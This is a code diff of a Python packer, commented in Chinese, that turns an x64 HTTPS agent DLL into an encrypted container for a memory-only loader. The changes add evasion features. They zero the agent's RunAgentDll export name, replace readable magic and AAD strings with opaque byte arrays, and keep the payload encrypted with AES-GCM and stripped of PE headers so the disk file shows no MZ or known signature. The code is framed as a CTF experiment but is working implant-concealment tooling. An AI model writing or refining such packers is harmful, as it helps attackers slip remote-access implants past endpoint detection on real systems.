@@ -11,6 +11,9 @@ DHPL1 = Direct HTTPS Profile Loader v1.
 4. 不把 DOS header / NT header / section header table 原样塞进容器；
 5. 预先找到 RunAgentDll 的 RVA，运行时 loader 不再需要 export table。
 
+可选地，打包时可以用 ``--scrub-export-name`` 清理映射镜像中的
+``RunAgentDll`` 导出名字。loader 已经保存了入口 RVA，不会依赖这段字符串。
+
 注意：这不是通用 PE packer。它只支持本实验里的 x64 direct_https DLL。
 """
 
@@ -27,7 +30,7 @@ from pathlib import Path
 from typing import Iterable
 
 
-DEFAULT_KEY = "CHANGE_ME_MEMORY_LOADER_KEY"
+DEFAULT_KEY = "ctf-memory-loader-key-20260624"
 
 IMAGE_FILE_MACHINE_AMD64 = 0x8664
 IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20B
@@ -53,27 +56,26 @@ IMAGE_ORDINAL_FLAG64 = 0x8000000000000000
 IMAGE_REL_BASED_ABSOLUTE = 0
 IMAGE_REL_BASED_DIR64 = 10
 
-DHPL_MAGIC = b"DHPL1\x00\x00\x00"
+DHPL_MAGIC = bytes((0x4C, 0x57, 0x39, 0x15, 0x4B, 0x00, 0x00, 0x00))
 DHPL_VERSION = 1
 
-# 外层加密信封。内层明文仍是 DHPL1；磁盘文件从本轮开始是：
+# 外层加密信封。内层明文仍是 DHPL1；磁盘文件固定为：
 #   DHPLE2 header + salt + nonce + tag + AES-256-GCM ciphertext
 #
-# 说明：
-# - v0 用 XOR，只能算“混淆”，没有真正的完整性校验；
-# - v1 使用 AES-256-GCM + SHA256(passphrase) key；
-# - v2 使用 AES-256-GCM + PBKDF2-HMAC-SHA256(passphrase, salt, iterations) key；
-# - v2 比 v1 多了随机 salt 和迭代次数，避免同一 passphrase 每次派生出同一个 key。
-ENC_MAGIC_V1 = b"DHPLE1\x00\x00"
-ENC_MAGIC = b"DHPLE2\x00\x00"
+# 当前只保留 DHPLE2：
+# - AES-256-GCM
+# - PBKDF2-HMAC-SHA256(passphrase, salt, iterations)
+# - 每文件随机 salt / nonce
+ENC_MAGIC = bytes((0x48, 0x5D, 0x72, 0x05, 0x6A, 0x02, 0x00, 0x00))
 ENC_VERSION = 2
-ENC_ALG_AES256_GCM_SHA256_KEY = 1
 ENC_ALG_AES256_GCM_PBKDF2_SHA256_KEY = 2
 ENC_KDF_PBKDF2_HMAC_SHA256 = 1
 ENC_PBKDF2_ITERATIONS = 100_000
-ENC_AAD_V1 = b"DHPL1-AES256-GCM-SHA256KEY-v1"
-ENC_AAD = b"DHPL1-AES256-GCM-PBKDF2-SHA256-v2"
-ENC_HEADER_STRUCT_V1 = struct.Struct("<8sIIIIII")
+ENC_AAD = bytes((
+    0x79, 0x3B, 0x73, 0x0C, 0x26, 0x4C, 0x27, 0x10,
+    0x48, 0x73, 0x63, 0x6A, 0x0A, 0x33, 0x0E, 0x21,
+    0x06, 0x3C, 0x02, 0x53, 0x6D, 0x67, 0x16, 0x1A,
+))
 ENC_HEADER_STRUCT = struct.Struct("<8sIIIIIIIII")
 
 HEADER_STRUCT = struct.Struct("<8sIIIIQ" + "I" * 18)
@@ -91,19 +93,6 @@ def sha256_file(path: Path) -> str:
         for chunk in iter(lambda: f.read(1024 * 1024), b""):
             h.update(chunk)
     return h.hexdigest()
-
-
-def derive_aes_key_sha256(passphrase: str) -> bytes:
-    """Derive the legacy DHPLE1 AES-256 key used by older containers.
-
-    这里选 SHA-256(passphrase) 是为了让 Windows 侧可以只依赖系统自带 CNG
-    API 复现同一结果，不再引入额外第三方 crypto 代码。
-    """
-
-    raw = passphrase.encode("utf-8")
-    if not raw:
-        raise ValueError("empty key is not allowed")
-    return hashlib.sha256(raw).digest()
 
 
 def derive_aes_key_pbkdf2(passphrase: str, salt: bytes, iterations: int) -> bytes:
@@ -160,7 +149,7 @@ def encrypt_envelope_aes_gcm(plain: bytes, passphrase: str) -> tuple[bytes, dict
         "envelope": "DHPLE2",
         "algorithm": "AES-256-GCM",
         "key_derivation": "PBKDF2-HMAC-SHA256(passphrase, salt, iterations)",
-        "aad": ENC_AAD.decode("ascii"),
+        "aad_hex": ENC_AAD.hex(),
         "salt_hex": salt.hex(),
         "iterations": ENC_PBKDF2_ITERATIONS,
         "nonce_hex": nonce.hex(),
@@ -329,7 +318,8 @@ class PEImage:
     def read_at_rva(self, rva: int, size: int) -> bytes:
         return self.data[self.rva_to_offset(rva, size) : self.rva_to_offset(rva, size) + size]
 
-    def parse_run_agent_rva(self) -> int:
+    def parse_run_agent_export(self) -> tuple[int, int]:
+        """Return the RunAgentDll RVA and its file offset in the export name table."""
         export_rva, export_size = self.directory(IMAGE_DIRECTORY_ENTRY_EXPORT)
         if not export_rva or export_size < 40:
             raise ValueError("DLL has no export directory")
@@ -359,8 +349,12 @@ class PEImage:
             func_rva = u32(self.data, self.rva_to_offset(address_of_functions + ordinal_index * 4, 4))
             if export_rva <= func_rva < export_rva + export_size:
                 raise ValueError("forwarded RunAgentDll export is not supported")
-            return func_rva
+            name_offset = self.rva_to_offset(name_rva, len(b"RunAgentDll"))
+            return func_rva, name_offset
         raise ValueError("cannot find exported RunAgentDll")
+
+    def parse_run_agent_rva(self) -> int:
+        return self.parse_run_agent_export()[0]
 
     def parse_relocations(self) -> list[int]:
         reloc_rva, reloc_size = self.directory(IMAGE_DIRECTORY_ENTRY_BASERELOC)
@@ -444,8 +438,9 @@ class PEImage:
         return callbacks
 
 
-def build_plain_container(pe: PEImage) -> tuple[bytes, dict]:
-    run_agent_rva = pe.parse_run_agent_rva()
+def build_plain_container(pe: PEImage, scrub_export_name: bool = False) -> tuple[bytes, dict]:
+    run_agent_rva, export_name_offset = pe.parse_run_agent_export()
+    export_name = b"RunAgentDll"
     relocs = pe.parse_relocations()
     imports = pe.parse_imports()
     tls_callbacks = pe.parse_tls_callbacks()
@@ -487,7 +482,15 @@ def build_plain_container(pe: PEImage) -> tuple[bytes, dict]:
         if s.raw_size and not (s.characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA):
             if s.raw_ptr + s.raw_size > len(pe.data):
                 raise ValueError(f"raw data for section {s.name} exceeds file")
-            data_blob = pe.data[s.raw_ptr : s.raw_ptr + s.raw_size]
+            data_blob = bytearray(pe.data[s.raw_ptr : s.raw_ptr + s.raw_size])
+            if scrub_export_name and s.raw_ptr <= export_name_offset < s.raw_ptr + s.raw_size:
+                name_rel = export_name_offset - s.raw_ptr
+                if name_rel + len(export_name) > len(data_blob):
+                    raise ValueError("RunAgentDll export name crosses section raw data")
+                if bytes(data_blob[name_rel : name_rel + len(export_name)]) != export_name:
+                    raise ValueError("RunAgentDll export name bytes changed unexpectedly")
+                data_blob[name_rel : name_rel + len(export_name)] = b"\x00" * len(export_name)
+            data_blob = bytes(data_blob)
             data_size = len(data_blob)
         blob_offset = data_offset + len(section_data) if data_size else 0
         section_records += SECTION_STRUCT.pack(
@@ -559,6 +562,8 @@ def build_plain_container(pe: PEImage) -> tuple[bytes, dict]:
         "size_of_headers": pe.size_of_headers,
         "entry_point_rva": f"0x{pe.entry_point_rva:x}",
         "run_agent_rva": f"0x{run_agent_rva:x}",
+        "export_name_scrubbed": scrub_export_name,
+        "export_name_file_offset": f"0x{export_name_offset:x}",
         "section_count": len(active_sections),
         "reloc_count": len(relocs),
         "import_count": len(imports),
@@ -584,10 +589,15 @@ def main(argv: Iterable[str] | None = None) -> int:
     parser.add_argument("input_dll", type=Path)
     parser.add_argument("output_dhpl", type=Path)
     parser.add_argument("key", nargs="?", default=DEFAULT_KEY)
+    parser.add_argument(
+        "--scrub-export-name",
+        action="store_true",
+        help="zero the mapped RunAgentDll export name after extracting its RVA",
+    )
     args = parser.parse_args(argv)
 
     pe = PEImage(args.input_dll)
-    plain, meta = build_plain_container(pe)
+    plain, meta = build_plain_container(pe, scrub_export_name=args.scrub_export_name)
     encrypted, enc_meta = encrypt_envelope_aes_gcm(plain, args.key)
 
     args.output_dhpl.parent.mkdir(parents=True, exist_ok=True)
@@ -602,7 +612,6 @@ def main(argv: Iterable[str] | None = None) -> int:
             "disk_starts_with_mz": encrypted.startswith(b"MZ"),
             "disk_starts_with_dhpl": encrypted.startswith(DHPL_MAGIC),
             "disk_starts_with_dhple": encrypted.startswith(ENC_MAGIC),
-            "disk_starts_with_dhple1": encrypted.startswith(ENC_MAGIC_V1),
             "disk_starts_with_dhple2": encrypted.startswith(ENC_MAGIC),
             "decrypted_starts_with_mz": plain.startswith(b"MZ"),
             "decrypted_starts_with_dhpl": plain.startswith(DHPL_MAGIC),
